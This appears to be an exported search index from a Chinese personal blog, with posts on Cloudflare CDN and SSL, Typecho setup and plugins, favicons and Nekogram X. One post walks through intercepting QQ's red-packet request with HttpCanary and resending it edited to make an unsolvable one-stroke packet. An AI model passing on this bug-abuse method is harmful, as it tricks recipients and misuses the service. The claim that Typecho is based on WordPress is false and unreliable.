title="回顾"></a>回顾</h2><p>之前创建了一个独立子域名分站用阿里云CDN，由于主站需要继续使用Cloudflare免费SSL解析。而Cloudflare要求将域名解析权交Cloudflare</p><div class="note note-light">            <p>即使用CDN必须要也使用他家DNS，除非申请合作伙伴</p>          </div><p>于是我使用阿里云DNS，指定域名创建NS解析使用Cloudflare；指定域名创建CNAME解析使用阿里CDN<br>可接着我发现NS解析不允许创建在根域名上</p><div class="note note-light">            <p>发现问题了</p>          </div><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>于是<br><img src="https://www.jiecs.xyz/usr/uploads/2021/04/4290162710.jpg" alt="IMG_20210420_113436.jpg" title="IMG_20210420_113436.jpg"><br>Cloudflare支持设置仅DNS，指定域名CNAME指向阿里云CDN即可<br><img src="https://www.jiecs.xyz/usr/uploads/2021/04/94617244.jpg" alt="IMG_20210420_113549.jpg" title="IMG_20210420_113549.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免费启用HTTPS-使你的网站更安全</title>
    <link href="/archives/36/"/>
    <url>/archives/36/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>众所周知许多浏览器如360“安全”浏览器，在访问不含SSL加密即使用HTTP协议的网站时，会提示危险不安全。而绝大多数SSL证书都是付费的，且价格不菲</p><h2 id="在Cloudflare注册证书"><a href="#在Cloudflare注册证书" class="headerlink" title="在Cloudflare注册证书"></a>在Cloudflare注册证书</h2><p>Cloudflare–&gt;SSL&#x2F;TLS–&gt;完全（严格）</p><p>源服务器–&gt;创建证书</p><p>一般保持默认</p><p>复制密钥key和证书pem</p><h2 id="宝塔面板安装证书"><a href="#宝塔面板安装证书" class="headerlink" title="宝塔面板安装证书"></a>宝塔面板安装证书</h2><p>网站–&gt;SSL证书</p><p>粘贴复制的证书和密钥</p><p>保存</p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>这时候就可以试试用https访问你的网站了</p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免费配置Cloudflare CDN</title>
    <link href="/archives/35/"/>
    <url>/archives/35/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>考虑到Cloudflare提供免费的SSL证书，本站已切换至CloudflareCDN</p><h2 id="Cloudflare中设置网站"><a href="#Cloudflare中设置网站" class="headerlink" title="Cloudflare中设置网站"></a>Cloudflare中设置网站</h2><p>打开<a href="https://cloudflare.com/">https://cloudflare.com</a> 注册登录账号<br>添加站点</p><p>域名切换到Cloudflare DNS</p><h2 id="配置解析"><a href="#配置解析" class="headerlink" title="配置解析"></a>配置解析</h2><p>添加3w,@,子域名，勾选代理而不是仅限DNS</p><div class="note note-light">            <p>由于CloudflareDNS与CDN整合，所以不需要你添加CNAME解析</p>          </div>><div class="note note-light">            <p>注意不要添加泛解析*CDN无法启用泛解析<br>不用听他的启用邮箱MX解析，你可以使用gmail或QQ邮箱，要用可以自己折腾，直接解析会导致你的服务器IP地址暴露</p>          </div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>挺简单的，完成了</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>让你的博客收到评论后通知你</title>
    <link href="/archives/32/"/>
    <url>/archives/32/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>主要是收到了这条电子邮件，我想给我的博客也搞个</p><h2 id="Typecho插件安装"><a href="#Typecho插件安装" class="headerlink" title="Typecho插件安装"></a>Typecho插件安装</h2><p>首先下载<a href="https://wws.lanzous.com/iXDw5nwt7ab">这个插件</a><br>通过ftp上传至服务器&#x2F;usr&#x2F;plugins&#x2F;文件夹</p><p>后台插件管理中启用插件</p><h2 id="你的电子邮箱设置"><a href="#你的电子邮箱设置" class="headerlink" title="你的电子邮箱设置"></a>你的电子邮箱设置</h2><p>接着打开你的邮箱</p><div class="note note-light">            <p>以QQfoxmail邮箱示例<br>这边不推荐使用gmail,即使使用自带代理的QQ邮箱,推送也不及时</p>          </div><p>设置–&gt;账户–&gt;POP3&#x2F;IMAP&#x2F;SMTP&#x2F;Exchange&#x2F;CardDAV&#x2F;CalDAV服务</p><p>开启IMAP&#x2F;SMTP服务</p><div class="note note-light">            <p>其他邮箱操作相似</p>          </div><p>如已经开启则获取授权码</p><p>复制授权码</p><h2 id="Typecho插件设置"><a href="#Typecho插件设置" class="headerlink" title="Typecho插件设置"></a>Typecho插件设置</h2><p>SMTP服务器<code>smtp.qq.com</code><br>SMTP端口<code>465</code>或<code>587</code><br>STMP用户_你的完整电子邮箱地址_<br>STMP密码_刚复制的授权码_<br>勾选_服务器需要验证_和_ssl加密_<br>其余自行设置</p><p>参考下图</p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>可以尝试发送测试邮件，并进行详细设置</p><div class="note note-light">            <p>相关链接</p>          </div><p><a href="https://www.mosq.cn/mip/477.html">https://www.mosq.cn/mip/477.html</a><br><a href="https://blog.toutop.cn/444.html">https://blog.toutop.cn/444.html</a></p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何提取网站logo图标</title>
    <link href="/archives/31/"/>
    <url>/archives/31/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>有时候添加友情链接需要网站图标，而对方没有提供，这时候就需要提取网站图标</p><h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>打开你的网站<br>鼠标任意处右键–&gt;查看源代码(Ctrl+U)</p><div class="note note-light">            <p>安卓端浏览器操作各有不同，这里展示via<br>底栏–&gt;三杠–&gt;工具箱–&gt;源码</p>          </div><p>通常情况如果是Typecho搭建的站点差不多是以下格式</p><p>图标位置很明显</p><h2 id="不通常情况"><a href="#不通常情况" class="headerlink" title="不通常情况"></a>不通常情况</h2><p>绝大多数非个人博客网站图标放置位置不会循规蹈矩，但也不会很不一样</p><p>例如百度的图标就不在那个位置，在后面，而且不完整</p><p>一般会用’&#x2F;favicon.ico’表示，点上去即可<br>如果找不到也可以试试页内查找(Ctrl+F)关键词 ‘.ico’ ‘icon’<br><strong>还有一种办法</strong><br>绝大多数非个人博客网站会以’<a href="http://">http:&#x2F;&#x2F;</a>[主域名]favicon.ico’来放置图标<br>例如<br><a href="http://www.jd.com/favicon.ico">http://www.jd.com/favicon.ico</a><br><a href="http://www.baidu.com/favicon.ico">http://www.baidu.com/favicon.ico</a></p><h2 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h2><p>我们就可以得到价值200万的小米logo一个！</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安卓即时通讯软件-Nekogram X</title>
    <link href="/archives/30/"/>
    <url>/archives/30/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>即时通讯即一个终端连往一个即时通讯网络的服务。即时通讯不同于e-mail在于它的交谈是即时的。大部分的即时通讯服务提供presence awareness的特性——显示联系人名单、联系人是否在线上等。即时通讯软件典型的代表有：QQ、微信、Whatapps、Skype等</p><h2 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h2><p>而有一个名叫Telegram的通讯软件以隐私、开源、强大获得了不错的口碑</p><div class="note note-light">            <p>Telegram又简称TG,意译电报</p>          </div><p>Telegram有自己的安卓端、ios端、macOS端甚至网页端。体验相当好不过，不过还是有点小问题比如不能拖气泡、没有翻译等</p><h2 id="TG的第三方客户端-Nekogram-X"><a href="#TG的第三方客户端-Nekogram-X" class="headerlink" title="TG的第三方客户端-Nekogram X"></a>TG的第三方客户端-Nekogram X</h2><p>但因为Telegram开源，开放api，也有许多第三方客户端如Nekogram X</p><div class="note note-light">            <p>也许你之前就在想：明明题目是“最牛逼的安卓通讯软件-Nekogram X”为什么在讲Telegram呢？现在进入正题了</p>          </div><h2 id="Nekogram-X"><a href="#Nekogram-X" class="headerlink" title="Nekogram X"></a>Nekogram X</h2><p><em>动画</em> Nekogram X 首先处处有着完美丝滑的动画 <em>功能</em> 虽然不能拖小点点但也能便捷地已读消息 还能翻译消息</p><div class="note note-light">            <p>选择翻译api</p>          </div><p>甚至可以导入你的机场代理订阅 因为是通讯软件所以一般需要常驻后台收消息，而单独开一个代理客户端又很麻烦还占内存。所以这功能就尤为重要 包括一些其他的小功能像定时消息都很不错，</p><h2 id="没了"><a href="#没了" class="headerlink" title="没了"></a>没了</h2><p>由于是Telegram的api和开源代码，Nekogram X保留许多Telegram的特性。真的是目前最牛逼的即时通讯软件了。可惜国内基本没人用，而且为了隐私没有从通讯录导入联系人的功能。</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>QQ无解一笔画红包</title>
    <link href="/archives/29/"/>
    <url>/archives/29/</url>
    
    <content type="html"><![CDATA[<div class="note note-light">            <p>这篇文章使用移动设备浏览体验更佳！</p>          </div><h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><div class="note note-light">            <p>腾讯随时可能修复这个bug！截止3.13号还没有问题</p>          </div><p>最近QQ一笔画的红包特别火(?)反正挺有意思的<br><img src="https://jiecs.xyz/usr/uploads/2021/03/2797009428.jpg" alt="IMG_20210314_124923.jpg" title="IMG_20210314_124923.jpg"><br>这篇文章会教你做一个无解的一笔画红包(有什么用呢)结果差不多这样<br><img src="https://jiecs.xyz/usr/uploads/2021/03/3418051569.jpg" alt="IMG_20210314_130503.jpg" title="IMG_20210314_130503.jpg"></p><h2 id="安装HttpCanary"><a href="#安装HttpCanary" class="headerlink" title="安装HttpCanary"></a>安装HttpCanary</h2><div class="note note-light">            <p>HttpCanary是一个抓包软件，可以获取应用向服务器发送的信息&#x2F;请求并进行一些操作</p>          </div><p><a href="https://rayanx.lanzous.com/iB0ojlwxgna">https://rayanx.lanzous.com/iB0ojlwxgna</a> 下载apk并安装</p><div class="note note-light">            <p>版本3.3.6。链接不是我的，酷安<a href="https://t.cn/A6tn2F99">https://t.cn/A6tn2F99</a></p>          </div><p>安装好会请求vpn权限，并要求获取超级用户权限以安装证书、证书移至系统</p><div class="note note-light">            <p>安装证书不是必须的，但建议。没有解根目录的可能需要安装这个magisk模块，magisk自带的模块仓库里就有 <img src="https://jiecs.xyz/usr/uploads/2021/03/3687578619.jpg" alt="IMG_20210314_124146.jpg" title="IMG_20210314_124146.jpg"></p>          </div><h2 id="抓包前的操作"><a href="#抓包前的操作" class="headerlink" title="抓包前的操作"></a>抓包前的操作</h2><p>HttpCanary主界面–&gt;左上角三条杠–&gt;目标应用选择QQ<br><img src="https://jiecs.xyz/usr/uploads/2021/03/520706011.jpg" alt="IMG_20210314_132830.jpg" title="IMG_20210314_132830.jpg"></p><div class="note note-light">            <p>一般包名相同用户不同(即系统自带分身)情况下无论是分身还是主应用都可以抓包，第三方应用分身或虚拟机可能需要其他操作</p>          </div><p>打开QQ对自己设置一笔画红包，像这样，不要点确定<br><img src="https://jiecs.xyz/usr/uploads/2021/03/15188474.jpg" alt="IMG_20210314_133701.jpg" title="IMG_20210314_133701.jpg"></p><div class="note note-light">            <p>这时候可以给QQ上个后台锁、给HttpCanary后台弹出界面权限。非必要，但建议</p>          </div><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>切回HttpCanary点击右下角小飞机开始抓包<br><img src="https://jiecs.xyz/usr/uploads/2021/03/2115540327.jpg" alt="IMG_20210314_135310.jpg" title="IMG_20210314_135310.jpg"><br>一开始可能有一些杂七杂八的流量涌进来，点击右上角垃圾桶清除<br>切回QQ点击确定，在切回HttpCanary</p><div class="note note-light">            <p>如果上面开了权限，这一步会方便很多，有一个抓包悬浮窗在可以操作</p>          </div><p>总之最后你应该可以找到一个长这样的请求<br><img src="https://jiecs.xyz/usr/uploads/2021/03/1776413005.jpg" alt="IMG_20210314_140222.jpg" title="IMG_20210314_140222.jpg"><br>点进去确认一下，差不多是这样<br><img src="https://jiecs.xyz/usr/uploads/2021/03/1029631443.jpg" alt="IMG_20210314_140434.jpg" title="IMG_20210314_140434.jpg"></p><h2 id="重写请求并发送"><a href="#重写请求并发送" class="headerlink" title="重写请求并发送"></a>重写请求并发送</h2><p>返回长按这个请求–&gt;编辑重发<br><img src="https://jiecs.xyz/usr/uploads/2021/03/3574430677.jpg" alt="IMG_20210314_141134.jpg" title="IMG_20210314_141134.jpg"><br>划到最底，选择下面的Body–&gt;在线编辑<br><img src="https://jiecs.xyz/usr/uploads/2021/03/3272204636.jpg" alt="IMG_20210314_141231.jpg" title="IMG_20210314_141231.jpg"><br>差不多是这样<br><img src="https://jiecs.xyz/usr/uploads/2021/03/1282454695.jpg" alt="IMG_20210314_141445.jpg" title="IMG_20210314_141445.jpg"><br>把x1和x改成9999–下方的图片链接删除–将id增加1<br><img src="https://jiecs.xyz/usr/uploads/2021/03/3369504991.jpg" alt="IMG_20210314_141914.jpg" title="IMG_20210314_141914.jpg"><br>点右上角的勾–&gt;点右上角的小飞机-发送请求</p><div class="note note-light">            <p>保证QQ在后台！</p>          </div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>重新打开一下QQ页面，正常情况你会见到你的自定义一笔画中出现了一个很奇怪的<br><img src="https://jiecs.xyz/usr/uploads/2021/03/2702364214.jpg" alt="IMG_20210314_142312.jpg" title="IMG_20210314_142312.jpg"><br>选中它发红包吧！</p><div class="note note-light">            <p>截止发稿时间这还的确是无解一笔画，只能等24小时退款</p>          </div>><div class="note note-light">            <p>相关链接</p>          </div><p><a href="https://b23.tv/qMzkvF">https://b23.tv/qMzkvF</a></p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何获得属于自己的博客</title>
    <link href="/archives/28/"/>
    <url>/archives/28/</url>
    
    <content type="html"><![CDATA[<div class="note note-light">            <p>OTA 日志<br>2021.2.27 首次放上文章调整格式放上图片，并对措辞进行修正<br>2021.2.28 增加“最后”<br>2021.3.15 因阿里云“上云采购季”活动价格调整，文章内容进行修正<br>2021.3.22 因本站启用CDN，文章内容进行修正</p>          </div><h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>由于又开学了，这篇文章&#x2F;教程是全程手机上完成的。截图用电脑ua比例4:3尽可能还原电脑的效果，但图片是直接截下的，手机看着还行，我想电脑看多少会有点糊，网页格式可能多少有些不一样，不少内容无法难以电脑ui或重现直接没搞。文章内容可能也有些简陋，之后暑假应该会做重置</p><h2 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h2><p>打开阿里云官网<a href="https://aliyun.com/">https://aliyun.com</a> 用支付宝登录一下，先实名认证，进入控制面板<br><img src="https://jiecs.xyz/usr/uploads/2021/02/898075664.jpg" alt="IMG_20210227_125008.jpg" title="IMG_20210227_125008.jpg"><br><a href="https://common-buy.aliyun.com/?commodityCode=swas">https://common-buy.aliyun.com/?commodityCode=swas</a> 先买服务器，主要是系统镜像这么选，别的怎么选都影响不大，配置最低就够了。可以支付宝支付，付完钱服务器等一会应该就能用了，没开机先开机<br><img src="https://jiecs.xyz/usr/uploads/2021/02/3715585312.jpg" alt="IMG_20210227_125022.jpg" title="IMG_20210227_125022.jpg"></p><div class="note note-light">            <p>文章演示使用轻量应用服务器，ECS也可以，有时后会有一些优惠往便宜的买,这边“开发者成长计划”轻量应用三个月只要28.5</p>          </div><h2 id="安装宝塔面板"><a href="#安装宝塔面板" class="headerlink" title="安装宝塔面板"></a>安装宝塔面板</h2><div class="note note-light">            <p>这是一个免费服务器管理面板，操作比阿里云方便很多，可以一键安装各种基础框架</p>          </div><p>先进到这里<br><a href="https://www.bt.cn/bbs/thread-19376-1-1.html">https://www.bt.cn/bbs/thread-19376-1-1.html</a> 复制一下CentOS的安装指令。然后回阿里云的服务器管理面板打开远程连接<br><img src="https://jiecs.xyz/usr/uploads/2021/03/2577608535.jpg" alt="IMG_20210324_123501.jpg" title="IMG_20210324_123501.jpg"><br>先输入 sudo su root 回车<br>然后输入粘贴你从宝塔安装贴里复制的CentOS安装指令 回车<br>等服务器跑一会，中间问你是否安装，输y就行。告诉你安装成功后(一般是中文)复制下面的用户名和密码。暂时用不到，但要记录下来</p><div class="note note-light">            <p>如果你买了ECS而不是轻量应用操作可能不太一样，还要设置密码什么</p>          </div><h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>打开<a href="https://wanwang.aliyun.com/">https://wanwang.aliyun.com</a> 输入你网站想要的网址&#x2F;域名，后缀不要选中文的,国家政府的,一般不要.com.cn.这种,一般选.xyz.cc这种。然后哪个便宜选哪个，付钱很简单。<br>这边还是建议自己阿里万网上买域名，价格还算合理，自带阿里云DNS，修改DNS管理也方便&#x2F;快很多</p><h2 id="域名的解析"><a href="#域名的解析" class="headerlink" title="域名的解析"></a>域名的解析</h2><p>再回到阿里云的服务器管理面板复制一下公网IP<br><img src="https://jiecs.xyz/usr/uploads/2021/03/156082113.jpg" alt="IMG_20210324_123600.jpg" title="IMG_20210324_123600.jpg"><br>打开域名控制台，你的域名右边选解析–&gt;添加记录<br>这边一般需要添加两个记录，一个直接解析(@)一个泛解析(*)主机记录里修改解析方式<br><img src="https://jiecs.xyz/usr/uploads/2021/03/395560603.jpg" alt="IMG_20210323_071513.jpg" title="IMG_20210323_071513.jpg"><br>记录值粘贴你复制的主机IP，完成点击下面的确定；在加一个记录，这次主机记录里把*修改成@其他不变</p><div class="note note-light">            <p>阿里云对每个选项有详细的解释。其中TTL指缓冲时间，即设置后多长时间完全生效，一般选最短，默认也选了最短的10分钟</p>          </div><h2 id="设置网站基础框架"><a href="#设置网站基础框架" class="headerlink" title="设置网站基础框架"></a>设置网站基础框架</h2><p>在你的浏览器地址栏中输入之前复制的服务器公网IP，后面跟上端口号8888。即：<br>(服务器公网IP):8888</p><div class="note note-light">            <p>如果打不开见<a href="https://www.bt.cn/bbs/thread-2897-1-1.html">https://www.bt.cn/bbs/thread-2897-1-1.html</a><br>新的轻量应用服务器和旧的控制面板不太一样，但大同小异，安全组变成了防火墙</p>          </div><p>然后你就会见到宝塔面板的登录窗口，在这里输入你之前安装宝塔时的用户名和密码，初次进入可能会叫你注册宝塔账号，这是单独的账号，注册就行。登录进又会叫你安装服务器常用基础框架，选左边的推荐，下面选编译安装就行。<br>安装完，宝塔主面板选择左边的网站–&gt;添加站点<br><img src="https://jiecs.xyz/usr/uploads/2021/03/3847299099.jpg" alt="IMG_20210324_123659.jpg" title="IMG_20210324_123659.jpg"><br>一般把的网站泛解析,带www,不带www,主机IP都输进去<br>FTP和数据库这么选，密码之后还能看到，但我仍然建议你起个好记的<br><img src="https://jiecs.xyz/usr/uploads/2021/03/4012274731.jpg" alt="IMG_20210323_071525.jpg" title="IMG_20210323_071525.jpg"></p><p>然后安装Typecho。打开Typecho官网<a href="https://typecho.org/">https://typecho.org</a> 下载正式版</p><div class="note note-light">            <p>Typecho是一个基于WordPress的简单个人博客框架</p>          </div><p>获得一个压缩包打开宝塔面板左侧的文件，定位路径到&#x2F;www&#x2F;wwwroot&#x2F;(名字)<br><img src="https://jiecs.xyz/usr/uploads/2021/03/2462154463.jpg" alt="IMG_20210324_123740.jpg" title="IMG_20210324_123740.jpg"><br>完全解压压缩包所有文件放到里面，不要再创建一个新的文件夹，最后差不多是像上面那样<br>这个时候你就可以用主机IP直接访问你的网站了，后面不要加端口号8888。第一次进入Typecho会有一个引导叫你输入之前设置的数据库用户名和密码等等，再注册一个管理员账号，你的网站就基本有了。</p><h2 id="网站备案"><a href="#网站备案" class="headerlink" title="网站备案"></a>网站备案</h2><p>不过你仍然不可以直接通过你购买的域名访问网站，一般会跳转到test page184 阿里云未备案。点击下面的备案–&gt;创建备案。然后填一些东西(要是已成年的真实信息)又会叫你安装阿里云app人脸，过几小时阿里云客服打电活向你确认，一般一两天就能过</p><div class="note note-light">            <p>如果备案时间在法定节假日回复可能没这么及时。叫你填网站名字会有很多要求，一般随便填个abc个人这种。打来电话直接叫客服给你起一个名字，再问一下备案时间会算服务器时间嘛，备案期间我能进行网站基本搭建嘛这种</p>          </div><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>本站相关Typecho主题等可在上方“<a href="https://jiecs.xyz/index.php/about.html">我–&gt;授权</a>”独立页面中找到。<br>这篇文章&#x2F;教程只是教你建博客，不是建站，建站需要WordPress,PHP等高阶知识，我也不怎么会而且不是简单套个主题就完事，就连Typecho主题怎么安装文章里都没告诉你不过百度解决一切</p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>欢迎使用 Typecho</title>
    <link href="/archives/45/"/>
    <url>/archives/45/</url>
    
    <content type="html"><![CDATA[<p>如果您看到这篇文章,表示您的 blog 已经安装成功.</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
